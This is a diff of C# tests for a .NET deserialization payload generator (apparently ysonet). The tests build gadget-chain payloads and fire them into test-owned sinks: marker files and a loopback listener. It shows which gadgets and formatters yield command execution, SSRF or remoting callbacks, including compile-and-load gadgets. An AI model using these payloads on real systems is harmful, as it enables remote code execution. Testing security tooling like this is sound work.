+                    AssertTrue(known, "plugin " + name + " has no matrix row and no explicit exclusion (add one)");
+                }
+            }
+            finally
+            {
+                try { File.Delete(innerJson); } catch { }
+                try { File.Delete(tpqpInner); } catch { }
+                try { File.Delete(csFixture); } catch { }
+                try { File.Delete(resxOut); } catch { }
+            }
+
+            AssertTrue(failures.Count == 0,
+                "plugin matrix cells failed (" + failures.Count + "):\n  " + string.Join("\n  ", failures.ToArray()));
+        }
+
+        private static bool PluginHasMinify(IPlugin plugin)
+        {
+            if (plugin == null) return false;
+            foreach (OptionField f in OptionField.FromOptionSet(plugin.Options()))
+                if (string.Equals(f.Name, "minify", StringComparison.OrdinalIgnoreCase))
+                    return true;
+            return false;
+        }
+
+        // ---- 6.3 payload execution into test-owned sinks ----
+
+        // A loopback capture proxy: a TcpListener on 127.0.0.1:0 whose only job is to
+        // notice that a connection arrived. An SSRF/callback/remoting payload pointed at
+        // its Url makes the deserializer connect here; the accepted connection is the
+        // proof it fired. No external traffic, no rogue server.
+        private class LoopbackListener : IDisposable
+        {
+            private readonly System.Net.Sockets.TcpListener _listener;
+            private readonly System.Threading.Thread _thread;
+            private volatile bool _hit;
+            private volatile bool _stop;
+            public int Port { get; private set; }
+
+            public LoopbackListener()
+            {
+                _listener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Loopback, 0);
+                _listener.Start();
+                Port = ((System.Net.IPEndPoint)_listener.LocalEndpoint).Port;
+                _thread = new System.Threading.Thread(AcceptLoop);
+                _thread.IsBackground = true;
+                _thread.Start();
+            }
+
+            private void AcceptLoop()
+            {
+                try
+                {
+                    while (!_stop)
+                    {
+                        var client = _listener.AcceptTcpClient();
+                        _hit = true;
+                        try { client.Close(); } catch { }
+                    }
+                }
+                catch { /* Stop() unblocks AcceptTcpClient with an exception */ }
+            }
+
+            public string HttpUrl { get { return "http://127.0.0.1:" + Port + "/x"; } }
+            public string TcpUrl { get { return "tcp://127.0.0.1:" + Port + "/x"; } }
+
+            public bool Fired(int totalMs)
+            {
+                int waited = 0;
+                while (waited < totalMs && !_hit) { System.Threading.Thread.Sleep(50); waited += 50; }
+                return _hit;
+            }
+
+            public void Dispose()
+            {
+                _stop = true;
+                try { _listener.Stop(); } catch { }
+            }
+        }
+
+        private static string MarkerPath(string tag)
+        {
+            return Path.Combine(Path.GetTempPath(), "ysonet_fire_" + tag + ".txt");
+        }
+
+        // A self-closing marker command: cmd /c echo x > "marker". Works whether or not
+        // the caller (a plugin) wraps it again in cmd /c.
+        private static string MarkerCommand(string marker)
+        {
+            return "cmd /c echo x > \"" + marker + "\"";
+        }
+
+        private static void SafeDelete(string path)
+        {
+            try { if (path != null && File.Exists(path)) File.Delete(path); } catch { }
+        }
+
+        private static void SafeDeleteDir(string path)
+        {
+            try { if (path != null && Directory.Exists(path)) Directory.Delete(path, true); } catch { }
+        }
+
+        // Fire a gadget through its OWN self-test path: generate with Test=true on an STA
+        // thread, which runs the gadget's designed round-trip in-process and installs any
+        // serializationBinder the gadget sets (for example PSObject's LocalBinder, which
+        // resolves PSObject to the bundled recompiled vulnerable DLL - a plain deserialize
+        // would resolve it to the patched GAC assembly and never fire). The marker file is
+        // the proof. reasonIfSkipped is logged when the gadget does not fire on this machine
+        // (a Mono-only gadget on .NET Framework, or a patched framework) - not a failure.
+        private static void FireGadgetSelfTest(string gadget, string formatter, string reasonIfSkipped,
+            List<string> failures, ref int fired, ref int skipped, bool trace)
+        {
+            string marker = MarkerPath(gadget + "_selftest");
+            SafeDelete(marker);
+            if (trace) { Console.Error.WriteLine("    [fire] " + gadget + " (self-test)"); Console.Error.Flush(); }
+            try
+            {
+                RunSTA(delegate
+                {
+                    InputArgs ia = new InputArgs();
+                    ia.Cmd = MarkerCommand(marker);
+                    ia.IsRawCmd = true;
+                    ia.Test = true; // the gadget's own self-test deserializes (fires) in-process
+                    PayloadRunner.GenerateGadget(new GenerationRequest
+                    {
+                        GadgetName = gadget,
+                        FormatterName = formatter,
+                        OutputFormat = "",
+                        InputArgs = ia,
+                    });
+                });
+                if (WaitForFile(marker, 3000)) fired++;
+                else { skipped++; Console.Error.WriteLine("  [skip] fire " + gadget + " (self-test): marker not created - " + reasonIfSkipped); }
+            }
+            catch (Exception ex) { skipped++; Console.Error.WriteLine("  [skip] fire " + gadget + " (self-test): " + ex.Message); }
+            finally { SafeDelete(marker); }
+        }
+
+        // Generate the gadget's own payload with a marker command, deserialize it
+        // in-process on an STA thread, and prove the command fired via the marker file.
+        // formatter/deserialize helper are chosen per gadget by the caller.
+        private static void FireGadgetMarker(string gadget, string formatter, int variant,
+            bool minify, bool useSimpleType, string deserAs, bool required,
+            List<string> failures, ref int fired, ref int skipped, bool trace)
+        {
+            string tag = gadget + "_" + formatter + (variant > 0 ? "_v" + variant : "") + (minify ? "_m" : "") + (useSimpleType ? "_u" : "");
+            string marker = MarkerPath(tag);
+            SafeDelete(marker);
+            if (trace) { Console.Error.WriteLine("    [fire] " + tag); Console.Error.Flush(); }
+            try
+            {
+                InputArgs ia = new InputArgs();
+                ia.Cmd = MarkerCommand(marker);
+                ia.IsRawCmd = true;
+                ia.Test = false;
+                ia.Minify = minify;
+                ia.UseSimpleType = useSimpleType;
+                if (variant > 0)
+                    ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
+
+                GenerationRequest req = new GenerationRequest
+                {
+                    GadgetName = gadget,
+                    FormatterName = formatter,
+                    OutputFormat = "",
+                    InputArgs = ia,
+                };
+                RunResult r = PayloadRunner.GenerateGadget(req);
+                if (!r.Success)
+                {
+                    string msg = "fire " + tag + ": generate -> " + r.ErrorMessage;
+                    if (required) failures.Add(msg); else { skipped++; Console.Error.WriteLine("  [skip] " + msg); }
+                    return;
+                }
+
+                RunSTA(delegate
+                {
+                    if (deserAs == "bf") SerializersHelper.BinaryFormatter_deserialize((byte[])r.Raw);
+                    else if (deserAs == "xaml") SerializersHelper.Xaml_deserialize((string)r.Raw);
+                    else if (deserAs == "json") SerializersHelper.JsonNet_deserialize((string)r.Raw);
+                });
+
+                if (WaitForFile(marker, 3000)) fired++;
+                else
+                {
+                    string msg = "fire " + tag + ": marker not created";
+                    if (required) failures.Add(msg); else { skipped++; Console.Error.WriteLine("  [skip] " + msg + " (conditional)"); }
+                }
+            }
+            catch (Exception ex)
+            {
+                string msg = "fire " + tag + ": " + ex.Message;
+                if (required) failures.Add(msg); else { skipped++; Console.Error.WriteLine("  [skip] " + msg); }
+            }
+            finally { SafeDelete(marker); }
+        }
+
+        // Fire a *FromFile compile gadget: feed it a .cs whose constructor writes the
+        // marker, then let ysonet.exe deserialize (self-test) the BinaryFormatter payload
+        // so the compiled assembly runs. This is done in a SUBPROCESS on purpose: these
+        // gadgets run attacker-compiled code through XamlReader/Assembly.Load machinery
+        // that can crash the host process (XamlAssemblyLoadFromFile exits non-zero after
+        // firing), so isolating it keeps the test runner alive. The marker file is the
+        // proof, independent of the subprocess exit code.
+        private static void FireSelfClosingCs(string gadget, List<string> failures, ref int fired, ref int skipped, bool trace)
+        {
+            string exe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ysonet.exe");
+            if (!File.Exists(exe))
+            {
+                skipped++;
+                Console.Error.WriteLine("  [skip] fire " + gadget + " (self-cs): ysonet.exe not found beside the test exe");
+                return;
+            }
+
+            string marker = MarkerPath(gadget + "_selfcs");
+            string cs = Path.Combine(Path.GetTempPath(), "ysonet_selfcs_" + gadget + ".cs");
+            SafeDelete(marker);
+            File.WriteAllText(cs, "public class E { public E() { System.IO.File.WriteAllText(@\"" + marker + "\", \"x\"); } }");
+            if (trace) { Console.Error.WriteLine("    [fire] " + gadget + " (self-cs subprocess)"); Console.Error.Flush(); }
+            try
+            {
+                var psi = new System.Diagnostics.ProcessStartInfo(exe,
+                    "-g " + gadget + " -f BinaryFormatter -c \"" + cs + "\" -t");
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+                psi.RedirectStandardOutput = true;
+                psi.RedirectStandardError = true;
+                using (var proc = System.Diagnostics.Process.Start(psi))
+                {
+                    // Drain the pipes so a large payload on stdout cannot deadlock the wait.
+                    proc.OutputDataReceived += delegate { };
+                    proc.ErrorDataReceived += delegate { };
+                    proc.BeginOutputReadLine();
+                    proc.BeginErrorReadLine();
+                    if (!proc.WaitForExit(40000)) { try { proc.Kill(); } catch { } }
+                }
+                if (WaitForFile(marker, 2000)) fired++;
+                else failures.Add("fire " + gadget + " (self-cs subprocess): marker not created");
+            }
+            catch (Exception ex) { failures.Add("fire " + gadget + " (self-cs): " + ex.Message); }
+            finally { SafeDelete(marker); SafeDelete(cs); }
+        }
+
+        // Fire a plugin through its own -t self-test path into a marker sink.
+        private static void FirePluginMarker(string plugin, string[] baseArgv, List<string> failures, ref int fired, bool trace)
+        {
+            string marker = MarkerPath("plugin_" + plugin + "_" + string.Join("_", baseArgv));
+            SafeDelete(marker);
+            var argv = new List<string>(baseArgv);
+            argv.Add("-c"); argv.Add(MarkerCommand(marker));
+            argv.Add("-t");
+            if (trace) { Console.Error.WriteLine("    [fire] plugin " + plugin + " " + string.Join(" ", baseArgv)); Console.Error.Flush(); }
+            try
+            {
+                IPlugin instance = PluginRegistry.CreatePluginInstance(plugin);
+                ResetPluginStatics(instance == null ? null : instance.GetType());
+                RunSTA(delegate { PayloadRunner.RunPlugin(plugin, argv.ToArray()); });
+                if (WaitForFile(marker, 3500)) fired++;
+                else failures.Add("fire plugin " + plugin + " " + string.Join(" ", baseArgv) + ": marker not created");
+            }
+            catch (Exception ex) { failures.Add("fire plugin " + plugin + ": " + ex.Message); }
+            finally { SafeDelete(marker); }
+        }
+
+        // Fire Resx compileddotresources via a ysonet.exe subprocess self-test: it writes a
+        // .resources file then reads it back through a ResourceSet, which resolves reliably in
+        // a full ysonet process. The marker file is the proof.
+        private static void FireResxCompiledSubprocess(List<string> failures, ref int fired, ref int skipped, bool trace)
+        {
+            string exe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ysonet.exe");
+            if (!File.Exists(exe))
+            {
+                skipped++;
+                Console.Error.WriteLine("  [skip] fire Resx compileddotresources: ysonet.exe not found beside the test exe");
+                return;
+            }
+            string marker = MarkerPath("plugin_Resx_compiled");
+            string resxOut = Path.Combine(Path.GetTempPath(), "ysonet_fire.resources");
+            SafeDelete(marker); SafeDelete(resxOut);
+            if (trace) { Console.Error.WriteLine("    [fire] plugin Resx compileddotresources (subprocess)"); Console.Error.Flush(); }
+            try
+            {
+                // Escape the inner quotes of the marker command for the child command line.
+                string quotedCmd = "\"" + MarkerCommand(marker).Replace("\"", "\\\"") + "\"";
+                string args = "-p Resx -M compileddotresources -of \"" + resxOut + "\" -c " + quotedCmd + " -t";
+                var psi = new System.Diagnostics.ProcessStartInfo(exe, args);
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+                psi.RedirectStandardOutput = true;
+                psi.RedirectStandardError = true;
+                using (var proc = System.Diagnostics.Process.Start(psi))
+                {
+                    proc.OutputDataReceived += delegate { };
+                    proc.ErrorDataReceived += delegate { };
+                    proc.BeginOutputReadLine();
+                    proc.BeginErrorReadLine();
+                    if (!proc.WaitForExit(40000)) { try { proc.Kill(); } catch { } }
+                }
+                if (WaitForFile(marker, 2000)) fired++;
+                else failures.Add("fire plugin Resx compileddotresources (subprocess): marker not created");
+            }
+            catch (Exception ex) { failures.Add("fire plugin Resx compileddotresources: " + ex.Message); }
+            finally { SafeDelete(marker); SafeDelete(resxOut); }
+        }
+
+        private static void PayloadsFireIntoTestSinks()
+        {
+            bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
+            var failures = new List<string>();
+            int fired = 0, skipped = 0;
+
+            // ---- MARKER: gadgets whose BinaryFormatter output runs Process.Start on
+            // deserialize (their own gadget, or a default inner TFRP/TCD). ----
+            string[] bfMarkerGadgets =
+            {
+                "TextFormattingRunProperties", "TypeConfuseDelegate",
+                "AxHostState", "DataSet", "DataSetTypeSpoof", "DataSetOldBehaviour",
+                "ClaimsIdentity", "ClaimsPrincipal", "GenericPrincipal", "RolePrincipal",
+                "SessionSecurityToken", "SessionViewStateHistoryItem", "ToolboxItemContainer",
+                "WindowsIdentity", "WindowsPrincipal", "ResourceSet",
+            };
+            foreach (string g in bfMarkerGadgets)
+                FireGadgetMarker(g, "BinaryFormatter", 0, false, false, "bf", true, failures, ref fired, ref skipped, trace);
+
+            // Conditional MARKER (self-skip, not fail):
+            // - WindowsClaimsIdentity needs a non-GAC assembly (Microsoft.IdentityModel, a
+            //   NuGet dependency present here) to build the type on deserialize.
+            FireGadgetMarker("WindowsClaimsIdentity", "BinaryFormatter", 0, false, false, "bf", false, failures, ref fired, ref skipped, trace);
+            // - TypeConfuseDelegateMono targets the Mono delegate field layout (it sets BOTH
+            //   invocation-list slots to Process.Start, unlike TypeConfuseDelegate which sets
+            //   only the second). On .NET Framework that graph does not fire; generation is
+            //   covered in 6.2. - PSObject fires only through its OWN self-test, which installs a
+            //   LocalBinder to resolve PSObject to the bundled recompiled vulnerable DLL (a plain
+            //   deserialize would resolve it to the patched GAC assembly). Fire both through the
+            //   gadget's Test=true self-test (STA), which installs any binder the gadget needs.
+            FireGadgetSelfTest("TypeConfuseDelegateMono", "BinaryFormatter",
+                "Mono delegate layout; fires on Mono, not on .NET Framework", failures, ref fired, ref skipped, trace);
+            FireGadgetSelfTest("PSObject", "BinaryFormatter",
+                "CVE-2017-8565 is patched on this framework; PSObject fires only on an unpatched target", failures, ref fired, ref skipped, trace);
+
+            // MARKER via Xaml / Json.NET deserialize (STA).
+            FireGadgetMarker("ObjectDataProvider", "Xaml", 1, false, false, "xaml", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("GetterSecurityException", "Json.NET", 0, false, false, "json", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("GetterSettingsPropertyValue", "Json.NET", 0, false, false, "json", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("GetterSettingsPropertyValue", "Xaml", 0, false, false, "xaml", true, failures, ref fired, ref skipped, trace);
+
+            // Minify CORRECTNESS: a minified payload must still fire, not just be non-empty.
+            FireGadgetMarker("TextFormattingRunProperties", "BinaryFormatter", 0, true, false, "bf", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("TypeConfuseDelegate", "BinaryFormatter", 0, true, false, "bf", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("AxHostState", "BinaryFormatter", 0, true, false, "bf", true, failures, ref fired, ref skipped, trace);
+
+            // --usesimpletype on a Json.NET-family payload must still fire.
+            FireGadgetMarker("GetterSecurityException", "Json.NET", 0, true, true, "json", true, failures, ref fired, ref skipped, trace);
+
+            // ---- SELF_CLOSING_CS: compile-and-run gadgets whose compiled ctor writes the marker. ----
+            FireSelfClosingCs("ActivitySurrogateSelectorFromFile", failures, ref fired, ref skipped, trace);
+            FireSelfClosingCs("XamlAssemblyLoadFromFile", failures, ref fired, ref skipped, trace);
+            FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace);
+
+            // ---- Plugin MARKER via each plugin's own -t self-test path. ----
+            FirePluginMarker("Altserialization", new[] { "-M", "HttpStaticObjectsCollection" }, failures, ref fired, trace);
+            FirePluginMarker("Altserialization", new[] { "-M", "SessionStateItemCollection" }, failures, ref fired, trace);
+            FirePluginMarker("ApplicationTrust", new string[0], failures, ref fired, trace);
+            FirePluginMarker("TransactionManagerReenlist", new string[0], failures, ref fired, trace);
+
+            // Resx compileddotresources fires via a ResourceSet over the generated .resources
+            // file. That read is reliable in a fresh process (it needs ysonet's assembly
+            // resolver), so fire it via a subprocess self-test rather than in-process.
+            FireResxCompiledSubprocess(failures, ref fired, ref skipped, trace);
+
+            // ---- TEMPDIR: NetNonRce FileLogTraceListener creates a directory on deserialize,
+            // for all three formatter payloads (the JSON/XML input-escaping fix makes the Json.NET
+            // and JavaScriptSerializer paths honour a Windows path with backslashes too). ----
+            foreach (string fmt in new[] { "Json.NET", "JavaScriptSerializer", "Xaml" })
+                FireNetNonRceTempDir(fmt, failures, ref fired, trace);
+
+            // ---- LISTENER: SSRF/callback payloads connect to a loopback capture proxy. ----
+            foreach (string gadget in new[] { "PictureBox", "InfiniteProgressPage" })
+                foreach (string fmt in new[] { "Json.NET", "JavaScriptSerializer", "Xaml" })
+                    FireNetNonRceListener(gadget, fmt, failures, ref fired, trace);
+
+            // ObjectDataProvider variant 3 is the xamlurl SSRF variant: it fetches the URL on load.
+            FireOdpXamlUrlListener(failures, ref fired, trace);
+
+            // ObjRef remoting is finicky (needs a process-global client channel); best-effort.
+            FireObjRefListener(failures, ref fired, ref skipped, trace);
+
+            AssertTrue(fired > 25, "fired a large set of payloads into test-owned sinks (was " + fired + ", skipped " + skipped + ")");
+            AssertTrue(failures.Count == 0,
+                "execution cells failed (" + failures.Count + ", fired " + fired + ", skipped " + skipped + "):\n  "
+                + string.Join("\n  ", failures.ToArray()));
+        }
+
+        private static void FireNetNonRceTempDir(string formatter, List<string> failures, ref int fired, bool trace)
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ysonet_firedir_" + formatter.Replace(".", ""));
+            SafeDeleteDir(dir);
+            if (trace) { Console.Error.WriteLine("    [fire] NetNonRce FileLogTraceListener " + formatter + " (tempdir)"); Console.Error.Flush(); }
+            try
+            {
+                var argv = new[] { "-g", "FileLogTraceListener", "-f", formatter, "-i", dir, "-t" };
+                IPlugin p = PluginRegistry.CreatePluginInstance("NetNonRceGadgets");
+                ResetPluginStatics(p == null ? null : p.GetType());
+                RunSTA(delegate { PayloadRunner.RunPlugin("NetNonRceGadgets", argv); });
+                bool ok = WaitForDir(dir, 3000);
+                if (ok) fired++;
+                else failures.Add("fire NetNonRce FileLogTraceListener " + formatter + ": directory not created");
+            }
+            catch (Exception ex) { failures.Add("fire NetNonRce FileLogTraceListener " + formatter + ": " + ex.Message); }
+            finally { SafeDeleteDir(dir); }
+        }
+
+        private static void FireNetNonRceListener(string gadget, string formatter, List<string> failures, ref int fired, bool trace)
+        {
+            if (trace) { Console.Error.WriteLine("    [fire] NetNonRce " + gadget + " " + formatter + " (listener)"); Console.Error.Flush(); }
+            using (var listener = new LoopbackListener())
+            {
+                try
+                {
+                    var argv = new[] { "-g", gadget, "-f", formatter, "-i", listener.HttpUrl, "-t" };
+                    IPlugin p = PluginRegistry.CreatePluginInstance("NetNonRceGadgets");
+                    ResetPluginStatics(p == null ? null : p.GetType());
+                    RunSTA(delegate { PayloadRunner.RunPlugin("NetNonRceGadgets", argv); });
+                    if (listener.Fired(3000)) fired++;
+                    else failures.Add("fire NetNonRce " + gadget + " " + formatter + ": listener not hit");
+                }
+                catch (Exception ex) { failures.Add("fire NetNonRce " + gadget + " " + formatter + ": " + ex.Message); }
+            }
+        }
+
+        private static void FireOdpXamlUrlListener(List<string> failures, ref int fired, bool trace)
+        {
+            if (trace) { Console.Error.WriteLine("    [fire] ObjectDataProvider v3 xamlurl (listener)"); Console.Error.Flush(); }
+            using (var listener = new LoopbackListener())
+            {
+                try
+                {
+                    InputArgs ia = new InputArgs();
+                    ia.Cmd = "calc.exe"; // ignored by variant 3
+                    ia.Test = false;
+                    ia.ExtraArguments = new List<string> { "--variant", "3", "--xamlurl", listener.HttpUrl };
+                    GenerationRequest req = new GenerationRequest
+                    {
+                        GadgetName = "ObjectDataProvider",
+                        FormatterName = "Xaml",
+                        OutputFormat = "",
+                        InputArgs = ia,
+                    };
+                    RunResult r = PayloadRunner.GenerateGadget(req);
+                    if (!r.Success || !(r.Raw is string)) { failures.Add("fire ObjectDataProvider v3: generate -> " + (r.Success ? "not string" : r.ErrorMessage)); return; }
+                    RunSTA(delegate { SerializersHelper.Xaml_deserialize((string)r.Raw); });
+                    if (listener.Fired(3000)) fired++;
+                    else failures.Add("fire ObjectDataProvider v3 (xamlurl SSRF): listener not hit");
+                }
+                catch (Exception ex) { failures.Add("fire ObjectDataProvider v3: " + ex.Message); }
+            }
+        }
+
+        // ObjRef makes an outbound .NET Remoting call to the -c URL on deserialize, but the
+        // runtime only emits it when a matching client channel is registered (process-global).
+        // Best-effort: register a client channel, fire, capture the connection, unregister.
+        private static void FireObjRefListener(List<string> failures, ref int fired, ref int skipped, bool trace)
+        {
+            if (trace) { Console.Error.WriteLine("    [fire] ObjRef remoting (listener, best-effort)"); Console.Error.Flush(); }
+            System.Runtime.Remoting.Channels.IChannel channel = null;
+            using (var listener = new LoopbackListener())
+            {
+                try
+                {
+                    channel = new System.Runtime.Remoting.Channels.Tcp.TcpClientChannel(
+                        "ysonet_objref_" + listener.Port, null);
+                    System.Runtime.Remoting.Channels.ChannelServices.RegisterChannel(channel, false);
+
+                    InputArgs ia = new InputArgs();
+                    ia.Cmd = listener.TcpUrl;
+                    ia.Test = false;
+                    GenerationRequest req = new GenerationRequest
+                    {
+                        GadgetName = "ObjRef",
+                        FormatterName = "BinaryFormatter",
+                        OutputFormat = "",
+                        InputArgs = ia,
+                    };
+                    RunResult r = PayloadRunner.GenerateGadget(req);
+                    if (!r.Success || !(r.Raw is byte[]))
+                    {
+                        skipped++;
+                        Console.Error.WriteLine("  [skip] fire ObjRef: generate -> " + (r.Success ? "not byte[]" : r.ErrorMessage));
+                        return;
+                    }
+                    RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])r.Raw); });
+                    if (listener.Fired(3000)) fired++;
+                    else { skipped++; Console.Error.WriteLine("  [skip] fire ObjRef: listener not hit (remoting client channel did not emit)"); }
+                }
+                catch (Exception ex) { skipped++; Console.Error.WriteLine("  [skip] fire ObjRef: " + ex.Message); }
+                finally
+                {
+                    if (channel != null)
+                        try { System.Runtime.Remoting.Channels.ChannelServices.UnregisterChannel(channel); } catch { }
+                }
+            }
+        }
+
+        private static bool WaitForDir(string path, int totalMs)
+        {
+            int waited = 0;
+            while (waited < totalMs)
+            {
+                if (Directory.Exists(path)) return true;
+                System.Threading.Thread.Sleep(100);
+                waited += 100;
+            }
+            return Directory.Exists(path);
         }
 
         // ---- helpers -----------------------------------------------------------
